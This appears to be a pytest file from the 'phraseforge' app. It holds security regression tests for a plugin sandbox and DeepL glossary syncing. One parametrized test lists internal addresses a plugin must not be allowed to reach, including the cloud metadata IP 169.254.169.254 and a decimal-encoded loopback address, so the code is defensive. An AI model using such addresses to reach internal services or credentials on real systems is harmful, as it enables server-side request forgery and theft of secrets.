    return out


def test_other_programs_cannot_use_the_plugin_proxy():
    """R120: any local process could tunnel through it, fill the plugin's error list and its slots."""
    from phraseforge.plugins.netproxy import FilterProxy
    errors = []
    p = FilterProxy("demo", ["api.example.com"], errors.append)
    p.start()
    try:
        assert _connect(p, b"CONNECT api.example.com:443 HTTP/1.1\r\n\r\n").startswith(b"HTTP/1.1 407")
        assert _connect(p, b"CONNECT anything.invalid:443 HTTP/1.1\r\n\r\n").startswith(b"HTTP/1.1 407")
        assert errors == [] and list(p.denied) == []
        assert p.token in p.env()["HTTPS_PROXY"]
    finally:
        p.stop()


@pytest.mark.parametrize("host", ["127.0.0.1", "169.254.169.254", "localhost", "10.0.0.5", "2130706433",
                                  "printer.local"])
def test_local_addresses_are_not_network_permissions(host):
    """R121: network = ["127.0.0.1"] / metadata / localhost were accepted."""
    from phraseforge.plugins import manifest as mf
    with pytest.raises(mf.ManifestError):
        mf.parse('id = "n"\nname = "N"\nversion = "1.0.0"\napi_version = "1.0"\nentry = "p.py"\n'
                 'runtime = "python-subprocess"\nkinds = ["macro"]\nmacros = ["x"]\n'
                 f'[permissions]\nnetwork = ["{host}"]\n')


def test_allowed_name_that_points_inside_is_refused():
    """R121: an allowed DNS name resolving to this PC was tunnelled."""
    import base64
    from phraseforge.plugins.netproxy import FilterProxy
    p = FilterProxy("demo", ["localhost"])           # as if a public name resolved to 127.0.0.1
    p.start()
    try:
        auth = base64.b64encode(f"pf:{p.token}".encode())
        reply = _connect(p, b"CONNECT localhost:443 HTTP/1.1\r\nProxy-Authorization: Basic " + auth + b"\r\n\r\n")
        assert reply.startswith(b"HTTP/1.1 403")
    finally:
        p.stop()


def test_no_older_signed_version_under_required_signatures(tmp_path, monkeypatch):
    """R122: an older signed build installed over a newer one."""
    import re
    from phraseforge.plugins import manager as pm, signing
    priv, pub = signing.new_key()
    old = _hello_copy(tmp_path, "old")
    signing.sign_folder(old, priv)
    new = _hello_copy(tmp_path, "new")
    t = (new / "plugin.toml").read_text()
    (new / "plugin.toml").write_text(re.sub(r'(?m)^version\s*=\s*"[^"]*"', 'version = "9.9.9"', t))
    signing.sign_folder(new, priv)
    _require_signatures(monkeypatch, {pub})
    mgr = pm.PluginManager(Store(":memory:"), root=tmp_path / "plugins")
    mgr.install(new, accept=True)
    with pytest.raises(PermissionError, match="older"):
        mgr.install(old, accept=True)


def _streamer(tmp_path, body: str):
    from phraseforge.plugins import manifest as mf
    from phraseforge.plugins.host import PluginProcess
    (tmp_path / "plugin.py").write_text(
        "import json, sys, time\n"
        "def send(o):\n    sys.stdout.write(json.dumps(o) + '\\n'); sys.stdout.flush()\n"
        "for line in sys.stdin:\n    m = json.loads(line)\n    if 'id' not in m: continue\n" + body)
    m = mf.parse('id = "streamer"\nname = "S"\nversion = "1.0.0"\napi_version = "1.0"\nentry = "plugin.py"\n'
                 'runtime = "python-subprocess"\nkinds = ["macro"]\nmacros = ["x"]\n')
    return PluginProcess(m, tmp_path)


def test_progress_does_not_keep_a_plain_call_alive(tmp_path):
    """R123: empty $/progress pieces kept a 1 s macro call alive for 9 s."""
    import time
    from phraseforge.plugins.host import PluginTimeout
    p = _streamer(tmp_path, "    for _ in range(18):\n        time.sleep(0.5)\n"
                            "        send({'jsonrpc': '2.0', 'method': '$/progress', 'params': {'id': m['id'], 'text': ''}})\n"
                            "    send({'jsonrpc': '2.0', 'id': m['id'], 'result': {'text': 'late'}})\n")
    try:
        t = time.monotonic()
        with pytest.raises(PluginTimeout):
            p.call("macro", {"name": "x"}, timeout=1.0)
        assert time.monotonic() - t < 6                   # 1 s + the 2 s cancel grace; it was 9 s
        t = time.monotonic()
        with pytest.raises(PluginTimeout):                # empty pieces are no progress either
            p.call("macro", {"name": "x"}, timeout=1.0, on_progress=lambda _t: None)
        assert time.monotonic() - t < 6
    finally:
        p.stop()


def test_streamed_preview_is_plain_text():
    """R124: the Prompt Optimizer's live line showed streamed HTML (local images, links)."""
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.prompt_optimizer import PromptOptimizerWindow, _plain_line
    w = PromptOptimizerWindow(Store(":memory:"))
    assert w.status.textFormat() == Qt.PlainText
    assert _plain_line("a\u202eb\x07c") == "a b c"


def test_many_tiny_pieces_hit_the_stream_limit(tmp_path):
    """R125: 4 million one-character pieces stayed under the 4 MB character limit (290 MB here)."""
    from phraseforge.plugins.host import PluginError
    p = _streamer(tmp_path, "    msg = json.dumps({'jsonrpc': '2.0', 'method': '$/progress', 'params': {'id': m['id'], 'text': 'x'}})\n"
                            "    for _ in range(200000): sys.stdout.write(msg + '\\n')\n"
                            "    send({'jsonrpc': '2.0', 'id': m['id'], 'result': {'text': 'ok'}})\n")
    got = []
    try:
        with pytest.raises(PluginError, match="too much"):
            p.call("generate", {}, timeout=30, on_progress=got.append)
        assert len(got) < 100000
    finally:
        p.stop()


class _Glossaries:
    """A DeepL account's glossary API (mock)."""
    def __init__(self, ready=True, get_body=None, post_status=201):
        self.g, self.calls, self.n = {}, [], 0
        self.ready, self.get_body, self.post_status = ready, get_body, post_status

    def handler(self, r):
        import json
        import httpx
        self.calls.append(r.method)
        if r.method == "GET":
            if self.get_body is not None:
                return httpx.Response(200, content=self.get_body)
            return httpx.Response(200, json={"glossaries": [dict(v, ready=self.ready) for v in self.g.values()]})
        if r.method == "POST":
            if self.post_status >= 400:
                return httpx.Response(self.post_status, json={"message": "bad entries"})
            self.n += 1
            gid = f"g{self.n}"
            self.g[gid] = {"glossary_id": gid, **json.loads(r.content)}
            return httpx.Response(201, json={"glossary_id": gid})
        self.g.pop(r.url.path.rsplit("/", 1)[1], None)
        return httpx.Response(204)


@pytest.fixture
def deepl_account(monkeypatch):
    import httpx
    from phraseforge import ai
    real = httpx.Client
    monkeypatch.setattr(ai, "_GLOSSARY_IDS", {}, raising=False)        # the session cache (R126)
    monkeypatch.setattr(ai, "_GLOSSARY_REFUSED", {}, raising=False)
    monkeypatch.setattr(ai, "_post", lambda url, h, p, t: {"translations": [{"text": "ok"}]})

    def use(fake):
        monkeypatch.setattr(ai.httpx, "Client", lambda **kw: real(transport=httpx.MockTransport(fake.handler),
                                                                  timeout=kw.get("timeout")))
        return fake
    return use


def _deepl_settings(gl, langs):
    import json
    return {"ai.deepl_key": "k:fx", "translation.glossaries": json.dumps(gl),
            "translation.glossary_langs": json.dumps(langs), "translation.provider": "deepl"}


def test_one_glossary_never_deletes_another(deepl_account):
    """R126: syncing "A" deleted "A #b"'s copy; an unapproved {#loop 200} made 800 glossary requests."""
    from phraseforge.macros.engine import ExpansionContext, MacroEngine
    from tests.fakehost import FakeHost
    fake = deepl_account(_Glossaries())
    st = _deepl_settings({"A": "x=y", "A #b": "p=q"}, {"A": ["English", "German"], "A #b": ["English", "German"]})
    MacroEngine(FakeHost(st)).expand_to_text(
        '{#loop 200}{#translate hi -to German -glossary A}{#translate hi -to German -glossary "A #b"}{#endloop}',
        ExpansionContext(allow_privileged=False))
    assert fake.calls.count("DELETE") == 0 and fake.calls.count("POST") == 2 and len(fake.calls) <= 4


def test_glossary_being_prepared_is_not_deleted(deepl_account):
    """R127: a copy DeepL had not finished was deleted and uploaded again on every translation."""
    from phraseforge import ai
    fake = deepl_account(_Glossaries(ready=False))
    st = _deepl_settings({"A": "x=y"}, {"A": ["English", "German"]})
    for _ in range(3):
        assert ai.deepl_translate(st, "hi", "German") == "ok"
    assert "DELETE" not in fake.calls and fake.calls.count("POST") == 1


@pytest.mark.parametrize("body", [b"<html>proxy login</html>", b'{"glossaries": null}', b"[]"])
def test_odd_glossary_answers_do_not_lose_the_translation(deepl_account, body):
    """R128: a non-JSON or odd answer raised JSONDecodeError/TypeError past the non-fatal handler."""
    from phraseforge import ai
    deepl_account(_Glossaries(get_body=body))
    assert ai.deepl_translate(_deepl_settings({"A": "x=y"}, {"A": ["English", "German"]}), "hi", "German") == "ok"


def test_refused_glossary_is_not_sent_again(deepl_account):
    """R129: a glossary DeepL refused was uploaded again before every translation."""
    from phraseforge import ai
    fake = deepl_account(_Glossaries(post_status=400))
    st = _deepl_settings({"A": "x\x07=y"}, {"A": ["English", "German"]})
    for _ in range(5):
        assert ai.deepl_translate(st, "hi", "German") == "ok"
    assert fake.calls.count("POST") == 1
